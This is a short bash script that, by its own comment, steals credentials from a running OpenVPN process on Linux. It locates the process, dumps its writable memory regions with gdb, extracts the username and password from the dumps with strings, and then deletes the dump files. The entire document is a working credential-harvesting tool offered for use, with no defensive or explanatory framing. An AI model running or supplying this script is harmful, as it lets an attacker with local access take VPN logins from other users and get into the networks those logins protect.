#!/bin/bash
# This little hack-job will grab credentials from a running openvpn process in Linux
# Keep in mind this won't work if the user used the --auth-nocache flag
pid=$(ps -efww | grep -v grep | grep openvpn | awk '{print $2}')
echo $pid | grep rw-p /proc/$pid/maps | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' | while read start stop; do gdb --batch-silent --silent --pid $pid -ex "dump memory $pid-$start-$stop.dump 0x$start 0x$stop"; done
echo "Your credentials should be listed below as username/password"

strings *.dump | awk 'NR>=3 && NR<=4 { print }'
rm *.dump --force
